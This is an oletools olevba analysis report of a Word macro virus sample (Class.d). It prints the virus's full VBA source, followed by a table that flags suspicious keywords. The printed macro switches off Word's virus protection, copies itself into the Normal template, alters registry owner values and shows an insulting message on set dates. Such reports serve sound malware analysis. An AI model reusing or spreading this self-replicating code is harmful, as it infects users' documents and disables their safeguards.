olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-9dccfb1e6a6e22f54c6dedcbe0132d10742d2bbc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-9dccfb1e6a6e22f54c6dedcbe0132d10742d2bbc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Const REG_SZ As Long = 1
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Sub AutoOpen()
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
On Error GoTo out
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Options.VirusProtection = False
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Options.SaveNormalPrompt = False
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Options.ConfirmConversions = False
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
If nt > 70 And ad > 0 Then GoTo out
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
If nt < 70 Then
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
End If
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
With host.codemodule
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    For x = 1 To 16
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    .deletelines 1
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    Next x
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
End With
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
If nt < 70 Then
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    With host.codemodule
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    .replaceline 1, "Sub AutoClose()"
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    .replaceline 91, "Sub ToolsMacro()"
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    For x = 70 To 81
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
        .deletelines 62
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    Next x
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    .replaceline 35, "    For x = 1 To 4"
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    End With
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
End If
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
If nt < 70 Then
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
u = RegCloseKey(k)
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
End If
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
With host.codemodule
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    For x = 2 To 104 Step 2
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
    Next x
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
End With
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
out:
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
End Sub
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
Sub ViewVBCode()
'Mark Stutrud7/12/2002 10:01:57 PMExecutive on \\LSS\.EXECUTIVE.PRINTERS.STATE CENTER.MN.LSSRESUME3.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

